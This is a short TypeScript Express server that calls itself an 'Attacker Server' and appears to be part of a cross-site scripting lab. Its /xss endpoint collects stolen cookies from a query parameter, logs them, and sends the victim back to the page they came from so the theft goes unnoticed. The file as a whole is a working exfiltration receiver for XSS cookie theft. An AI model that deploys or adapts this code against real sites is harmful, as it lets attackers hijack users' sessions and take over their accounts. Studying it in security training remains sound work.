import express from 'express';

const app = express();
const port = 4000;

app.get('/xss', (req, res) => {
    const cookieValue = req.query.cookie; 
    console.log('Received cookie:', cookieValue); 
    res.redirect(req.headers.referer!.toString());
})

app.get("/", (req, res) => {
    res.send('Attacker Server');
});

app.listen(port, () => {
    console.log(`Attacker server is running on port http://localhost:${port}`);
});
